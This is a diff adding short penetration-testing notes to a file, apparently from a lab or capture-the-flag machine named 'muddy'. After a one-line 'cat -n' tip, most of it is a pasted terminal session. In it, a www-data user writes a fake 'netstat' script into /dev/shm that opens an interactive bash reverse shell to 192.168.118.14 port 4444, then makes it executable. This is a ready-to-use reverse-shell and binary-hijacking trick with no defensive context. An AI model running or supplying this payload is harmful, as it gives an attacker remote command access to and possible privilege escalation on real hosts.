@@ -1,2 +1,19 @@
+#!/usr/bin/peno
+
+#read a file with linenumbers
 cat -n file
+
+#Create a reverse Shell
+
+www-data@muddy:/dev/shm$ cat <<EOF>> ./netstat
+cat <<EOF>> ./netstat
+> #!/bin/bash
+#!/bin/bash
+> /bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
+/bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
+> EOF
+EOF
+www-data@muddy:/dev/shm$ chmod +x netstat
+chmod +x netstat
+www-data@muddy:/dev/shm$ 
 
